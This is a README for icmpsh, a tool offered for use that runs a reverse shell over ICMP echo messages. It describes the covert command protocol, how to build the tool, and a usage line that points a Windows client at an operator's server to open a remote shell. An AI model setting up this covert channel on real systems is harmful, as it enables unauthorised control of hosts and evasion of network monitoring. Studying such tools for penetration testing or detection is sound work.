<div align="center">

# icmpsh

<a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>

Interactive command execution over ICMP echo messages.

</div>

`icmpsh` implements a reverse shell that tunnels command execution over ICMP Echo Requests and Replies.

## How It Works

- The client periodically sends Echo Requests with a 24-byte signature identifying `icmpsh`.
- The server listens for Echo Requests. When the operator types a command, the server embeds it in the next Echo Reply back to the client.
- The client executes the command locally and returns stdout/stderr in the payload of subsequent Echo Requests.
- All application data is carried inside ICMP payloads; no TCP/UDP sockets are used.

Elevated (administrative/root) privileges are required for running the **server**. The **client** binary only works on Windows and does not require elevated permissions to run.

The server TUI supports multiple clients concurrently and presents them as seperate recipients with independent history and queued commands.

## Build

```
make
```

To build targets individually:

```
make client
make server
```

You will need [Cargo](https://doc.rust-lang.org/stable/cargo/) and [Clang](https://clang.llvm.org/).

### Usage

Start the server on a machine that can receive ICMP traffic:

```
./server
```

Run the client on a Windows host and point it at the server IP:

```
client.exe <server-ip>
```

> *Tip*: before running the server, disable the OS-level ICMP echo replies on the server host (for example `sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1` on Linux) so the kernel / host does not answer pings itself.